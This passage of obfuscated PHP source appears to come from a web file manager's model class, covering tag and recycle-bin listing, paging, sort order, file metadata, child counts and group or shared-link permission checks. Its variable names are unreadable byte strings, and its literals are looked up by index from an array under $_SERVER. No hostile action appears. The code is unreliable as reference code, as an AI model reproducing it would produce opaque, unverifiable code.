$Ÿ§ôàäì[$‘ÚàãÓí[$òáª¸Œí[84]]]; } } unset($‘ÚàãÓí); return $ó¿—¿şº; } public function listUserTag($ØõÈäó–) { $“óØÍØ =& $_SERVER[–Ú¬çÁ]; if ($ØõÈäó– && !is_array($ØõÈäó–)) { $ØõÈäó– = array($ØõÈäó–); } $È‡ÃĞŞÖ = Model($“óØÍØ[476])->listData(); $µÊê÷ø… = array(); $œªŒ—‘² = array(); foreach ($È‡ÃĞŞÖ as $‹¯ÀßµÑ) { $¶ˆŠíÁ« = $‹¯ÀßµÑ[$“óØÍØ[84]]; if (!$¶ˆŠíÁ«) { continue; } if (!isset($œªŒ—‘²[$¶ˆŠíÁ«])) { $œªŒ—‘²[$¶ˆŠíÁ«] = array(); } $œªŒ—‘²[$¶ˆŠíÁ«][] = $‹¯ÀßµÑ[$“óØÍØ[477]]; $µÊê÷ø…[$‹¯ÀßµÑ[$“óØÍØ[84]]] = $‹¯ÀßµÑ; } $´•ÖÇ¡… = array(); $‘ğ³Ê…á = array(); $¨ª¿†ËÇ = array(); foreach ($œªŒ—‘² as $Ù«š˜Ãî => $â²Ù½) { $”½Òî£· = !0; if (!$ØõÈäó–) { $´•ÖÇ¡…[] = $Ù«š˜Ãî; continue; } foreach ($ØõÈäó– as $¡òé¨è™) { if (!in_array($¡òé¨è™, $â²Ù½)) { $”½Òî£· = !1; break; } } if (!$”½Òî£·) { continue; } if (!is_numeric($Ù«š˜Ãî)) { $ÊƒÄ‰³ = $µÊê÷ø…[$Ù«š˜Ãî]; $øÜˆ¶¨ = array($“óØÍØ[32] => $ÊƒÄ‰³[$“óØÍØ[32]], $“óØÍØ[84] => $ÊƒÄ‰³[$“óØÍØ[84]], $“óØÍØ[33] => $ÊƒÄ‰³[$“óØÍØ[33]], $“óØÍØ[87] => array($“óØÍØ[478] => 1), $“óØÍØ[226] => !0); if ($ÊƒÄ‰³[$“óØÍØ[33]] == $“óØÍØ[224]) { $¨ª¿†ËÇ[] = $øÜˆ¶¨; } if ($ÊƒÄ‰³[$“óØÍØ[33]] == $“óØÍØ[75]) { $‘ğ³Ê…á[] = $øÜˆ¶¨; } continue; } $´•ÖÇ¡…[] = $Ù«š˜Ãî; } if ($´•ÖÇ¡…) { $ÁÇø™¤É = $this->listSource(array($“óØÍØ[468] => array($“óØÍØ[469], $´•ÖÇ¡…))); } $ÁÇø™¤É = $ÁÇø™¤É ? $ÁÇø™¤É : array($“óØÍØ[82] => array(), $“óØÍØ[83] => array()); $ÁÇø™¤É[$“óØÍØ[82]] = array_merge($ÁÇø™¤É[$“óØÍØ[82]], $‘ğ³Ê…á); $ÁÇø™¤É[$“óØÍØ[83]] = array_merge($ÁÇø™¤É[$“óØÍØ[83]], $¨ª¿†ËÇ); if (isset($ÁÇø™¤É[$“óØÍØ[419]]) && count($´•ÖÇ¡…) == $ÁÇø™¤É[$“óØÍØ[419]][$“óØÍØ[420]]) { return $ÁÇø™¤É; } $äÍüèÁª = array(); $ŞŸß¾ì‘ = array_to_keyvalue($ÁÇø™¤É[$“óØÍØ[82]], $“óØÍØ[12], $“óØÍØ[181]); $Ö¨»ÖÈÇ = array_to_keyvalue($ÁÇø™¤É[$“óØÍØ[83]], $“óØÍØ[12], $“óØÍØ[181]); $‚†İä» = array_merge($Ö¨»ÖÈÇ, $ŞŸß¾ì‘); foreach ($´•ÖÇ¡… as $¶ˆŠíÁ«) { if (!in_array($¶ˆŠíÁ«, $‚†İä»)) { $äÍüèÁª[] = $¶ˆŠíÁ«; } } if ($äÍüèÁª) { Model($“óØÍØ[479])->removeBySource($äÍüèÁª); } return $ÁÇø™¤É; } public function listUserRecycle() { $â÷³· =& $_SERVER[–Ú¬çÁ]; $—ÀŒ°€¡ = Model($â÷³·[480])->listData(); if (!$—ÀŒ°€¡) { return array(); } $õ»ú†ò˜ = array($â÷³·[468] => array($â÷³·[469], $—ÀŒ°€¡), $â÷³·[481] => 1); return $this->listSource($õ»ú†ò˜); } public function listSource($ò¶ä€š›, $ï¥°ü‘ = 3000, $èË±â”ç = false) { $›¤ ÌÄí =& $_SERVER[–Ú¬çÁ]; if (!isset($ò¶ä€š›[$›¤ ÌÄí[482]])) { $ò¶ä€š›[$›¤ ÌÄí[482]] = 0; } if (isset($ò¶ä€š›[$›¤ ÌÄí[180]]) && $ò¶ä€š›[$›¤ ÌÄí[180]] == $›¤ ÌÄí[222]) { $ò¶ä€š›[$›¤ ÌÄí[463]] = array($›¤ ÌÄí[384], $›¤ ÌÄí[483]); } $Á¯èğîù = $›¤ ÌÄí[484]; $äöÍ‡€§ = $this->field($Á¯èğîù)->_makeOrder()->where($ò¶ä€š›)->selectPage($ï¥°ü‘); $this->_listPageCheck($äöÍ‡€§, $Á¯èğîù, $ò¶ä€š›); $this->_listDataApply($äöÍ‡€§[$›¤ ÌÄí[422]], $èË±â”ç); $this->_listMake($äöÍ‡€§); return $äöÍ‡€§; } private function _listPageCheck(&$¦áÔ¢«ç, $¸à‹‹á, $¹üÆ»¨É) { $ì¥é‡ÌÉ =& $_SERVER[–Ú¬çÁ]; if (!is_array($¦áÔ¢«ç[$ì¥é‡ÌÉ[419]])) { return; } $ãò©‡ñÒ = $¦áÔ¢«ç[$ì¥é‡ÌÉ[419]]; if ($ãò©‡ñÒ[$ì¥é‡ÌÉ[421]] <= 1) { return; } if ($ãò©‡ñÒ[$ì¥é‡ÌÉ[420]] >= 100000) { return; } if (Model($ì¥é‡ÌÉ[485])->get($ì¥é‡ÌÉ[486]) != $ì¥é‡ÌÉ[487]) { return; } $¸à‹‹á = str_replace(array($ì¥é‡ÌÉ[53], $ì¥é‡ÌÉ[395], $ì¥é‡ÌÉ[206]), $ì¥é‡ÌÉ[12], $¸à‹‹á); $¸à‹‹á = $ì¥é‡ÌÉ[488] . str_replace($ì¥é‡ÌÉ[50], $ì¥é‡ÌÉ[489], $¸à‹‹á) . $ì¥é‡ÌÉ[490]; $Ğ´Î’Äó = $ì¥é‡ÌÉ[491]; $Ğ´Î’Äó = $Ğ´Î’Äó . $ì¥é‡ÌÉ[492]; $à»È›Ãˆ = $ãò©‡ñÒ[$ì¥é‡ÌÉ[416]] * ($ãò©‡ñÒ[$ì¥é‡ÌÉ[406]] - 1) . $ì¥é‡ÌÉ[50] . $ãò©‡ñÒ[$ì¥é‡ÌÉ[416]]; $è¦óóş = $this->_makeOrder(!0); $©Í¹å°´ = $ì¥é‡ÌÉ[488] . str_replace($ì¥é‡ÌÉ[50], $ì¥é‡ÌÉ[489], $è¦óóş[0]); if (strpos($©Í¹å°´, $ì¥é‡ÌÉ[493])) { $©Í¹å°´ = str_replace($ì¥é‡ÌÉ[493], $ì¥é‡ÌÉ[494], $©Í¹å°´); } else { $©Í¹å°´ .= $ì¥é‡ÌÉ[495] . $è¦óóş[1]; } $Šş³–Çœ = array(); foreach ($¹üÆ»¨É as $¬¤‰ŞÑ› => $¯ƒğ–öÌ) { $Šş³–Çœ[$ì¥é‡ÌÉ[488] . $¬¤‰ŞÑ›] = $¯ƒğ–öÌ; } $this->alias($ì¥é‡ÌÉ[496])->field($¸à‹‹á)->limit($à»È›Ãˆ)->order($©Í¹å°´); $¾¸ÖÌè¿ = $this->join($Ğ´Î’Äó)->where($Šş³–Çœ)->select(); if ($¾¸ÖÌè¿) { $¦áÔ¢«ç[$ì¥é‡ÌÉ[422]] = $¾¸ÖÌè¿; } } protected function _makeOrder($Ì˜¯¼–Õ = false) { $®†Ÿñ– =& $_SERVER[–Ú¬çÁ]; $ª¿ùĞí = Model($®†Ÿñ–[497])->get($®†Ÿñ–[498]); $†ª«ï§Í = Model($®†Ÿñ–[497])->get($®†Ÿñ–[499]); $çÑş×¸ = array($®†Ÿñ–[500] => $®†Ÿñ–[501], $®†Ÿñ–[502] => $®†Ÿñ–[503]); $±«Ÿ—ö  = array($®†Ÿñ–[32] => $®†Ÿñ–[32], $®†Ÿñ–[76] => $®†Ÿñ–[76], $®†Ÿñ–[175] => $®†Ÿñ–[463], $®†Ÿñ–[504] => $®†Ÿñ–[504], $®†Ÿñ–[505] => $®†Ÿñ–[506], $®†Ÿñ–[225] => $®†Ÿñ–[225], $®†Ÿñ–[85] => $®†Ÿñ–[85]); $Á¢†ôÕ» = Input::get($®†Ÿñ–[507], $®†Ÿñ–[7], $ª¿ùĞí, array_keys($±«Ÿ—ö )); $Ÿº¹¢ä = Input::get($®†Ÿñ–[508], $®†Ÿñ–[7], $†ª«ï§Í, array_keys($çÑş×¸)); if (!in_array($Á¢†ôÕ», array_keys($±«Ÿ—ö ))) { $Á¢†ôÕ» = $®†Ÿñ–[32]; } if (!in_array($Ÿº¹¢ä, array_keys($çÑş×¸))) { $Á¢†ôÕ» = $®†Ÿñ–[500]; } if ($Á¢†ôÕ» == $®†Ÿñ–[32]) { } $±æ±´’Ù = $®†Ÿñ–[509] . $±«Ÿ—ö [$Á¢†ôÕ»] . $®†Ÿñ–[53] . $çÑş×¸[$Ÿº¹¢ä]; $±æ±´’Ù = rtrim(trim($±æ±´’Ù), $®†Ÿñ–[50]); if ($Ì˜¯¼–Õ) { return array($±æ±´’Ù, $çÑş×¸[$Ÿº¹¢ä]); } return $this->order($±æ±´’Ù); } protected function _listDataApplyItem($ıÛ¶Ùµ, $íÃàóÒ± = false) { $º–µÎ© = array($ıÛ¶Ùµ); $this->_listDataApply($º–µÎ©, $íÃàóÒ±); return $º–µÎ©[0]; } protected function _listDataApply(&$ÚÃ²ßñû, $¸–²ş¹æ = false) { $‹²èóŞŞ =& $_SERVER[–Ú¬çÁ]; if (!$ÚÃ²ßñû) { $ÚÃ²ßñû = array(); return; } $ã«‚ú´ = array_to_keyvalue($ÚÃ²ßñû, $‹²èóŞŞ[12], $‹²èóŞŞ[181]); $ã«‚ú´ = array_unique($ã«‚ú´); $this->_listSourceCache($ÚÃ²ßñû); if (!$¸–²ş¹æ) { $this->_listAppendMeta($ÚÃ²ßñû, $ã«‚ú´); $this->_listAppendFileMeta($ÚÃ²ßñû, $ã«‚ú´); $this->_listAppendChildren($ÚÃ²ßñû, $ã«‚ú´); } $this->_listAppendPath($ÚÃ²ßñû); $this->_listAppendAuth($ÚÃ²ßñû); $this->_listAppendSourceInfo($ÚÃ²ßñû, $ã«‚ú´); $this->_listAppendUser($ÚÃ²ßñû); $this->_listFilterInfo($ÚÃ²ßñû, $¸–²ş¹æ); $this->_listAppendAuthSecret($ÚÃ²ßñû); } protected function _listSourceCache($âø§ğ±ø) { $†Äç¶õ¾ =& $_SERVER[–Ú¬çÁ]; foreach ($âø§ğ±ø as $€èˆÑñµ) { self::$cacheSourceInfo[$†Äç¶õ¾[510] . $€èˆÑñµ[$†Äç¶õ¾[181]]] = $€èˆÑñµ; } } protected function _listFilterInfo(&$™å¶İÆÊ, $”ÓáØ½¥ = false) { $‚„ü»ã„ =& $_SERVER[–Ú¬çÁ]; foreach ($™å¶İÆÊ as &$»¾”Ğüæ) { $»¾”Ğüæ = $this->pathInfoFilter($»¾”Ğüæ); self::$cachePathInfo[$‚„ü»ã„[511] . intval($”ÓáØ½¥) . $‚„ü»ã„[439] . $»¾”Ğüæ[$‚„ü»ã„[181]]] = $»¾”Ğüæ; } unset($»¾”Ğüæ); } protected function _listMake(&$ó€Ó’ÁÙ) { $¶ãøš£– =& $_SERVER[–Ú¬çÁ]; $ó€Ó’ÁÙ[$¶ãøš£–[82]] = array(); $ó€Ó’ÁÙ[$¶ãøš£–[83]] = array(); foreach ($ó€Ó’ÁÙ[$¶ãøš£–[422]] as $¤ø¡¸ä°) { $¶üÃÜœâ = $¤ø¡¸ä°[$¶ãøš£–[462]] == 1 ? $¶ãøš£–[82] : $¶ãøš£–[83]; $ó€Ó’ÁÙ[$¶üÃÜœâ][] = $¤ø¡¸ä°; } unset($ó€Ó’ÁÙ[$¶ãøš£–[422]]); } protected function _listAppendMeta(&$Õï³–†, $®‡òÎÙÄ) { $ğĞ‚€ÂÚ =& $_SERVER[–Ú¬çÁ]; $Ø³€ñí = array($ğĞ‚€ÂÚ[468] => array($ğĞ‚€ÂÚ[469], $®‡òÎÙÄ)); $è–ğ†¿ = Model($ğĞ‚€ÂÚ[512])->field($ğĞ‚€ÂÚ[513])->where($Ø³€ñí)->select(); if (!$è–ğ†¿) { return; } $’ë¨ê—¬ = array($ğĞ‚€ÂÚ[514], $ğĞ‚€ÂÚ[515], $ğĞ‚€ÂÚ[494]); $¬Æ¢Ä®ï = array(); foreach ($è–ğ†¿ as $…²ıáœ) { if (!isset($¬Æ¢Ä®ï[$…²ıáœ[$ğĞ‚€ÂÚ[181]]])) { $¬Æ¢Ä®ï[$…²ıáœ[$ğĞ‚€ÂÚ[181]]] = array(); } if (in_array($…²ıáœ[$ğĞ‚€ÂÚ[94]], $’ë¨ê—¬)) { continue; } $¬Æ¢Ä®ï[$…²ıáœ[$ğĞ‚€ÂÚ[181]]][$…²ıáœ[$ğĞ‚€ÂÚ[94]]] = $…²ıáœ[$ğĞ‚€ÂÚ[427]]; } foreach ($Õï³–† as &$·Ú„¨Í) { $·Ú„¨Í[$ğĞ‚€ÂÚ[516]] = !1; if (isset($¬Æ¢Ä®ï[$·Ú„¨Í[$ğĞ‚€ÂÚ[181]]])) { $·Ú„¨Í[$ğĞ‚€ÂÚ[516]] = $¬Æ¢Ä®ï[$·Ú„¨Í[$ğĞ‚€ÂÚ[181]]]; } if ($this->fileIsLock($·Ú„¨Í) && $·Ú„¨Í[$ğĞ‚€ÂÚ[464]]) { $Ü¨ó‚œ­ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $·Ú„¨Í[$ğĞ‚€ÂÚ[464]][$ğĞ‚€ÂÚ[465]] = AuthModel::authDisable($·Ú„¨Í[$ğĞ‚€ÂÚ[464]][$ğĞ‚€ÂÚ[465]], $Ü¨ó‚œ­); $·Ú„¨Í[$ğĞ‚€ÂÚ[464]][$ğĞ‚€ÂÚ[517]][$ğĞ‚€ÂÚ[464]] = $·Ú„¨Í[$ğĞ‚€ÂÚ[464]][$ğĞ‚€ÂÚ[465]]; } } unset($·Ú„¨Í); } protected function _listAppendFileMeta(&$ë­Šéˆ¶, $§•¥²Ø™) { $„Îš„¢ =& $_SERVER[–Ú¬çÁ]; $•ÔçØ’å = array_to_keyvalue($ë­Šéˆ¶, $„Îš„¢[12], $„Îš„¢[518]); $•ÔçØ’å = array_filter(array_unique($•ÔçØ’å)); if (!$•ÔçØ’å) { return; } $ì¼ÂüÚ¯ = array($„Îš„¢[519] => array($„Îš„¢[469], $•ÔçØ’å)); $øËëÀ = $„Îš„¢[520]; $ôÌ¥»À = Model($„Îš„¢[521])->field($øËëÀ)->where($ì¼ÂüÚ¯)->select(); $ôÌ¥»À = array_to_keyvalue($ôÌ¥»À, $„Îš„¢[518]); $Ñı†ºÜ = Model($„Îš„¢[522])->field($„Îš„¢[523])->where($ì¼ÂüÚ¯)->select(); $Ñı†ºÜ = $Ñı†ºÜ ? $Ñı†ºÜ : array(); $ÇÉåÒ”â = array(); foreach ($Ñı†ºÜ as $ß¿úô›™) { if (!isset($ÇÉåÒ”â[$ß¿úô›™[$„Îš„¢[518]]])) { $ÇÉåÒ”â[$ß¿úô›™[$„Îš„¢[518]]] = array(); } $ÇÉåÒ”â[$ß¿úô›™[$„Îš„¢[518]]][$ß¿úô›™[$„Îš„¢[94]]] = $ß¿úô›™[$„Îš„¢[427]]; } foreach ($ë­Šéˆ¶ as &$á°ÄÌ) { $è©Õ›ùØ = $á°ÄÌ[$„Îš„¢[518]]; if (!$è©Õ›ùØ || !is_array($ôÌ¥»À[$è©Õ›ùØ])) { continue; } $ñÙÙÖ¹Ø = $ôÌ¥»À[$è©Õ›ùØ]; $ñÙÙÖ¹Ø[$„Îš„¢[76]] = $á°ÄÌ[$„Îš„¢[76]]; $ñÙÙÖ¹Ø[$„Îš„¢[32]] = $á°ÄÌ[$„Îš„¢[32]]; if (!$ñÙÙÖ¹Ø[$„Îš„¢[524]]) { Model($„Îš„¢[521])->fileMd5Check($ñÙÙÖ¹Ø); } if (!isset(self::$cacheFileInfo[$„Îš„¢[525] . $è©Õ›ùØ])) { self::$cacheFileInfo[$„Îš„¢[525] . $è©Õ›ùØ] = array_merge(array(), $ñÙÙÖ¹Ø); } unset($ôÌ¥»À[$è©Õ›ùØ][$„Îš„¢[84]]); $™°©öòœ = is_array($ÇÉåÒ”â[$è©Õ›ùØ]) ? $ÇÉåÒ”â[$è©Õ›ùØ] : array(); $á°ÄÌ[$„Îš„¢[526]] = array_merge($™°©öòœ, $ôÌ¥»À[$è©Õ›ùØ]); if (isset($á°ÄÌ[$„Îš„¢[526]][$„Îš„¢[171]])) { $á°ÄÌ[$„Îš„¢[171]] = json_decode($á°ÄÌ[$„Îš„¢[526]][$„Îš„¢[171]], !0); unset($á°ÄÌ[$„Îš„¢[526]][$„Îš„¢[171]]); } } unset($á°ÄÌ); } protected function _listAppendSourceInfo(&$ìëñ­æŞ, $¯·®öº») { $‰¡¡Ô»¯ =& $_SERVER[–Ú¬çÁ]; $¿¸ëöï¢ = Model($‰¡¡Ô»¯[527])->listData(); $ì€¼Œ•½ = Model($‰¡¡Ô»¯[476])->listData(); $Í»¼‹¼æ = Model($‰¡¡Ô»¯[466])->listData(); $±­ÏÏÙ = Model($‰¡¡Ô»¯[528])->listSimple(); $ˆ‹—î“İ = array_to_keyvalue($¿¸ëöï¢, $‰¡¡Ô»¯[452]); $‚£ó›‡ = array_to_keyvalue_group($ì€¼Œ•½, $‰¡¡Ô»¯[84], $‰¡¡Ô»¯[477]); $„óĞª„» = array_to_keyvalue($Í»¼‹¼æ, $‰¡¡Ô»¯[84]); $å¥ÛÎáñ = array_to_keyvalue_group($±­ÏÏÙ, $‰¡¡Ô»¯[181]); foreach ($ìëñ­æŞ as &$Êºâ‹ê´) { $Êºâ‹ê´[$‰¡¡Ô»¯[87]] = array($‰¡¡Ô»¯[529] => 0, $‰¡¡Ô»¯[530] => 0, $‰¡¡Ô»¯[531] => 0); if (isset($„óĞª„»[$Êºâ‹ê´[$‰¡¡Ô»¯[181]]])) { $Êºâ‹ê´[$‰¡¡Ô»¯[87]][$‰¡¡Ô»¯[532]] = 1; $Êºâ‹ê´[$‰¡¡Ô»¯[87]][$‰¡¡Ô»¯[533]] = $„óĞª„»[$Êºâ‹ê´[$‰¡¡Ô»¯[181]]][$‰¡¡Ô»¯[32]]; } if ($‚£ó›‡ && $ˆ‹—î“İ && isset($‚£ó›‡[$Êºâ‹ê´[$‰¡¡Ô»¯[181]]])) { $Êºâ‹ê´[$‰¡¡Ô»¯[87]][$‰¡¡Ô»¯[534]] = array(); foreach ($‚£ó›‡[$Êºâ‹ê´[$‰¡¡Ô»¯[181]]] as $¬Şà–Ä ) { $¦Ü‰‡Üß = $ˆ‹—î“İ[$¬Şà–Ä ]; $Êºâ‹ê´[$‰¡¡Ô»¯[87]][$‰¡¡Ô»¯[534]][] = array($‰¡¡Ô»¯[535] => $¦Ü‰‡Üß[$‰¡¡Ô»¯[452]], $‰¡¡Ô»¯[471] => $¦Ü‰‡Üß[$‰¡¡Ô»¯[32]], $‰¡¡Ô»¯[536] => $¦Ü‰‡Üß[$‰¡¡Ô»¯[537]]); } } if ($å¥ÛÎáñ && isset($å¥ÛÎáñ[$Êºâ‹ê´[$‰¡¡Ô»¯[181]]])) { $Êºâ‹ê´[$‰¡¡Ô»¯[87]][$‰¡¡Ô»¯[538]] = array(); foreach ($å¥ÛÎáñ[$Êºâ‹ê´[$‰¡¡Ô»¯[181]]] as $µŠ¿¶Ü) { $ûòÏ¨º = $‰¡¡Ô»¯[539]; if ($µŠ¿¶Ü[$‰¡¡Ô»¯[540]] == $‰¡¡Ô»¯[88]) { $ûòÏ¨º .= $‰¡¡Ô»¯[541]; } $Êºâ‹ê´[$‰¡¡Ô»¯[87]][$‰¡¡Ô»¯[538]] = array_field_key($µŠ¿¶Ü, explode($‰¡¡Ô»¯[50], $ûòÏ¨º)); } } } unset($Êºâ‹ê´); return $ìëñ­æŞ; } protected function _listAppendChildren(&$”ş­‹ª, $¤Òô ›) { $‡Í£ç€ê =& $_SERVER[–Ú¬çÁ]; $Ê“™û™Í = array(); $ñ¬¸çÕ± = array($‡Í£ç€ê[233] => 0, $‡Í£ç€ê[234] => 0); foreach ($”ş­‹ª as &$ëŠáˆŞŠ) { if (!$ëŠáˆŞŠ[$‡Í£ç€ê[462]]) { continue; } $Ê“™û™Í[] = $ëŠáˆŞŠ[$‡Í£ç€ê[181]]; } unset($ëŠáˆŞŠ); if (!$Ê“™û™Í) { return; } $©ö®äÖ¨ = array($‡Í£ç€ê[180] => array($‡Í£ç€ê[7], $Ê“™û™Í), $‡Í£ç€ê[482] => 0); $•ªç³‰á = array($‡Í£ç€ê[180], $‡Í£ç€ê[462], $‡Í£ç€ê[542] => $‡Í£ç€ê[543]); $®Û™ = $this->field($•ªç³‰á)->where($©ö®äÖ¨)->group($‡Í£ç€ê[544])->select(); $üíØ¨»Æ = array(); foreach ($®Û™ as $ÓìÄë²) { $Ê‹ Ç = $ÓìÄë²[$‡Í£ç€ê[180]]; $–îæÕë = $ÓìÄë²[$‡Í£ç€ê[462]] == $‡Í£ç€ê[88] ? $‡Í£ç€ê[234] : $‡Í£ç€ê[233]; if (!isset($üíØ¨»Æ[$Ê‹ Ç])) { $üíØ¨»Æ[$Ê‹ Ç] = array($‡Í£ç€ê[233] => 0, $‡Í£ç€ê[234] => 0); } $üíØ¨»Æ[$Ê‹ Ç][$–îæÕë] += $ÓìÄë²[$‡Í£ç€ê[543]]; } foreach ($”ş­‹ª as &$ëŠáˆŞŠ) { if (!$ëŠáˆŞŠ[$‡Í£ç€ê[462]]) { continue; } $§èÔÑî = is_array($üíØ¨»Æ[$ëŠáˆŞŠ[$‡Í£ç€ê[181]]]) ? $üíØ¨»Æ[$ëŠáˆŞŠ[$‡Í£ç€ê[181]]] : $ñ¬¸çÕ±; $ëŠáˆŞŠ[$‡Í£ç€ê[234]] = $§èÔÑî[$‡Í£ç€ê[234]]; $ëŠáˆŞŠ[$‡Í£ç€ê[233]] = $§èÔÑî[$‡Í£ç€ê[233]]; unset($ëŠáˆŞŠ[$‡Í£ç€ê[463]]); } unset($ëŠáˆŞŠ); } protected function _listAppendAuth(&$ãÎñèç») { $Ÿõ…ôÀ =& $_SERVER[–Ú¬çÁ]; $¬‹ºÈ£á = array(); foreach ($ãÎñèç» as $–ı‹•Ò©) { if ($–ı‹•Ò©[$Ÿõ…ôÀ[178]] == self::TYPE_GROUP) { $¬‹ºÈ£á[] = $–ı‹•Ò©[$Ÿõ…ôÀ[181]]; } } if (!$¬‹ºÈ£á) { return; } $—ì²¶÷² = array_to_keyvalue($ãÎñèç», $Ÿõ…ôÀ[181]); $Úí™Şœ = Model($Ÿõ…ôÀ[545])->getSourceList($¬‹ºÈ£á, $—ì²¶÷²); $ëÚ®ñœÜ = $GLOBALS[$Ÿõ…ôÀ[546]] == 1; foreach ($ãÎñèç» as $Ö­ğîÄ => &$–ı‹•Ò©) { $–ı‹•Ò©[$Ÿõ…ôÀ[464]] = $Úí™Şœ[$–ı‹•Ò©[$Ÿõ…ôÀ[181]]]; if (!$–ı‹•Ò©[$Ÿõ…ôÀ[464]] && $–ı‹•Ò©[$Ÿõ…ôÀ[178]] == self::TYPE_GROUP) { $–ı‹•Ò©[$Ÿõ…ôÀ[464]] = Action($Ÿõ…ôÀ[547])->pathGroupAuthMake($–ı‹•Ò©[$Ÿõ…ôÀ[548]]); if (!$–ı‹•Ò©[$Ÿõ…ôÀ[464]] && !$ëÚ®ñœÜ) { $–ı‹•Ò©[$Ÿõ…ôÀ[227]] = !1; $–ı‹•Ò©[$Ÿõ…ôÀ[226]] = !1; } } if ($–ı‹•Ò©[$Ÿõ…ôÀ[464]]) { $–ı‹•Ò©[$Ÿõ…ôÀ[227]] = AuthModel::authCheckEdit($–ı‹•Ò©[$Ÿõ…ôÀ[464]][$Ÿõ…ôÀ[465]]); $–ı‹•Ò©[$Ÿõ…ôÀ[226]] = AuthModel::authCheckView($–ı‹•Ò©[$Ÿõ…ôÀ[464]][$Ÿõ…ôÀ[465]]); } $this->groupPathDisplay($–ı‹•Ò©); } unset($–ı‹•Ò©); } public function _listAppendAuthSecret(&$™‡Äî±) { $ª­ë¦¹î =& $_SERVER[–Ú¬çÁ]; if (Model($ª­ë¦¹î[485])->get($ª­ë¦¹î[549]) != $ª­ë¦¹î[88]) { return; } static $½©õÍ­ = false; if (!$½©õÍ­) { $à¿¬Üòú = Model($ª­ë¦¹î[550]); $Èöìæ‚ = Model($ª­ë¦¹î[551]); $½©õÍ­ = $Èöìæ‚->listData(); $½©õÍ­ = array_to_keyvalue($½©õÍ­, $ª­ë¦¹î[181]); $£áí¬±— = json_decode(Model($ª­ë¦¹î[485])->get($ª­ë¦¹î[552]), !0); $£áí¬±— = array_to_keyvalue($£áí¬±—, $ª­ë¦¹î[452]); foreach ($½©õÍ­ as $ŒûÍ¦± => $¬Ú²è) { $Û ±Óìˆ = $£áí¬±—[$¬Ú²è[$ª­ë¦¹î[553]]]; if (!$Û ±Óìˆ) { $Èöìæ‚->remove($¬Ú²è[$ª­ë¦¹î[452]]); unset($½©õÍ­[$ŒûÍ¦±]); continue; } $åˆ¹­·¸ = $à¿¬Üòú->listData($Û ±Óìˆ[$ª­ë¦¹î[464]]); if (!$åˆ¹­·¸) { $Èöìæ‚->remove($¬Ú²è[$ª­ë¦¹î[452]]); unset($½©õÍ­[$ŒûÍ¦±]); continue; } $¬Ú²è[$ª­ë¦¹î[464]] = $åˆ¹­·¸; $¬Ú²è[$ª­ë¦¹î[554]] = $Û ±Óìˆ; $¬Ú²è[$ª­ë¦¹î[555]] = Model($ª­ë¦¹î[556])->getInfoSimpleOuter($¬Ú²è[$ª­ë¦¹î[504]]); $½©õÍ­[$ŒûÍ¦±] = $¬Ú²è; } } $Ù°†ü˜ = USER_ID; $˜­‡şÉÑ = array(); $‡ô¨™çÏ = $this->_listAppendPath($˜­‡şÉÑ, !0); foreach ($™‡Äî± as $ŒûÍ¦± => &$¬Ú²è) { if (!is_array($¬Ú²è[$ª­ë¦¹î[464]])) { continue; } if ($¬Ú²è[$ª­ë¦¹î[178]] != $ª­ë¦¹î[557]) { continue; } if (isset($½©õÍ­[$¬Ú²è[$ª­ë¦¹î[181]]])) { $†Ä°àö• = $½©õÍ­[$¬Ú²è[$ª­ë¦¹î[181]]]; if (!is_array($¬Ú²è[$ª­ë¦¹î[516]])) { $¬Ú²è[$ª­ë¦¹î[516]] = array(); } $¬Ú²è[$ª­ë¦¹î[516]][$ª­ë¦¹î[558]] = $†Ä°àö•[$ª­ë¦¹î[553]]; $¬Ú²è[$ª­ë¦¹î[464]][$ª­ë¦¹î[559]] = $†Ä°àö•; $¬Ú²è[$ª­ë¦¹î[464]][$ª­ë¦¹î[560]] = $¬Ú²è[$ª­ë¦¹î[561]]; $¬Ú²è[$ª­ë¦¹î[464]][$ª­ë¦¹î[562]] = $ª­ë¦¹î[88]; if ($†Ä°àö•[$ª­ë¦¹î[504]] != $Ù°†ü˜) { $¬Ú²è[$ª­ë¦¹î[464]][$ª­ë¦¹î[465]] = $¬Ú²è[$ª­ë¦¹î[464]][$ª­ë¦¹î[465]] & $†Ä°àö•[$ª­ë¦¹î[464]][$ª­ë¦¹î[464]]; } continue; } $˜ÍŒ’§ì = $this->parentLevelArray($¬Ú²è[$ª­ë¦¹î[563]]); $œóÓù = array_reverse($˜ÍŒ’§ì); foreach ($œóÓù as $Ã´¸Ü => $Ä¿šì£Ó) { if (!isset($½©õÍ­[$Ä¿šì£Ó])) { continue; } $†Ä°àö• = $½©õÍ­[$Ä¿šì£Ó]; $¬Ú²è[$ª­ë¦¹î[464]][$ª­ë¦¹î[559]] = $†Ä°àö•; if ($†Ä°àö•[$ª­ë¦¹î[504]] != $Ù°†ü˜) { $¬Ú²è[$ª­ë¦¹î[464]][$ª­ë¦¹î[465]] = $¬Ú²è[$ª­ë¦¹î[464]][$ª­ë¦¹î[465]] & $†Ä°àö•[$ª­ë¦¹î[464]][$ª­ë¦¹î[464]]; } $ñÍ»½Ó÷ = $ª­ë¦¹î[12]; $©™½¯ñÓ = count($˜ÍŒ’§ì) - $Ã´¸Ü; for ($¡ò¥¡î« = 0; $¡ò¥¡î« < $©™½¯ñÓ; $¡ò¥¡î«++) { if (!isset($‡ô¨™çÏ[$˜ÍŒ’§ì[$¡ò¥¡î«]])) { $ñÍ»½Ó÷ = $ª­ë¦¹î[12]; break; } $ñÍ»½Ó÷ = $ñÍ»½Ó÷ . rtrim($‡ô¨™çÏ[$˜ÍŒ’§ì[$¡ò¥¡î«]], $ª­ë¦¹î[8]) . $ª­ë¦¹î[8]; } $¬Ú²è[$ª­ë¦¹î[464]][$ª­ë¦¹î[560]] = rtrim($ñÍ»½Ó÷, $ª­ë¦¹î[8]) . $ª­ë¦¹î[8]; break; } } unset($¬Ú²è); } public function groupPathDisplay(&$ÇâÁ•Ä×) { $ œ—îÅë =& $_SERVER[–Ú¬çÁ]; if ($ÇâÁ•Ä×[$ œ—îÅë[178]] != self::TYPE_GROUP) { return; } $–Ó°¿¶Ï = Model($ œ—îÅë[564])->getInfo($ÇâÁ•Ä×[$ œ—îÅë[548]]); $·£¼÷şÅ = $this->parentLevelArray($–Ó°¿¶Ï[$ œ—îÅë[563]]); $ÕÀüøˆ = $ œ—îÅë[12]; foreach ($·£¼÷şÅ as $Ûñı¥¹ş) { $¦º›Ûçâ = Model($ œ—îÅë[564])->getInfo($Ûñı¥¹ş); $ÕÀüøˆ .= $¦º›Ûçâ[$ œ—îÅë[87]][$ œ—îÅë[181]] . $ œ—îÅë[50]; } 